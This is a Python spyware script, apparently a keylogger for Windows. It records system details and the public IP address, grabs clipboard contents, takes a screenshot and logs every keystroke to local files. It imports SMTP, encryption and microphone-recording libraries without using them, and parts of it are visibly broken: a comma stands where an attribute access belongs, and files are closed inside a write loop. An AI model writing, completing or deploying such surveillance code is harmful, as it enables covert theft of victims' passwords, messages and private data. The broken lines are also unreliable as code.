#libs

import smtplib

import socket
import platform

import win32clipboard

from pynput.keyboard import Key,Listener

import time
import os

from scipy.io.wavfile import write
import sounddevice as sd

from cryptography.fernet import Fernet

import getpass
from requests import get

from multiprocessing import Process, freeze_support
from PIL import ImageGrab

keys_info="log.txt"
sys_info="sys_info.txt"
clip_info="clip.txt"
audio_info="audio.wav"
ss_info="ss_info.png"

mic_time=10

def computer_info():
    with open(sys_info, "a") as f:
        hostname=socket.gethostname()
        IPAddr=socket.gethostbyname(hostname)
        try:
            public_ip=get("https://api.ipify.org"),text
            f.write("Public IP address: "+public_ip)
        except Exception:
            f.write("Couldnt get public ip address")

        f.write("Processor: "+ (platform.processor())+ '\n')
        f.write("System: "+ platform.system() +platform.version()+'\n')
        f.write("Machine: "+platform.machine()+'\n')
        f.write("Hostname: "+ hostname+'\n')
        f.write("Private IP address: "+ IPAddr+'\n')

computer_info()

def copy_clip():
    with open(clip_info,"a") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data=win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            f.write("Clipboard Data: \n"+ pasted_data)

        except:
            f.write("Clipboard could not be copied")

copy_clip()


def ss():
    im=ImageGrab.grab()
    im.save(ss_info)
    
ss()

count=0
keys=[]

def on_press(key):
    global keys,count
    print(key)
    keys.append(key)
    count +=1

    if count >=1:
        count =0
        write_file(keys)
        keys=[]

def write_file(keys):
    with open(keys_info,"a") as f:
        for key in keys:
            k=str(key).replace("'","")
            if k.find("space")>0:
                f.write('\n')
                f.close()

            elif k.find("key")==-1:
                f.write(k)
                f.close()

def on_release(key):
    if key==Key.esc:
        return False

with Listener(on_press=on_press,on_release=on_release) as listener:
    listener.join()
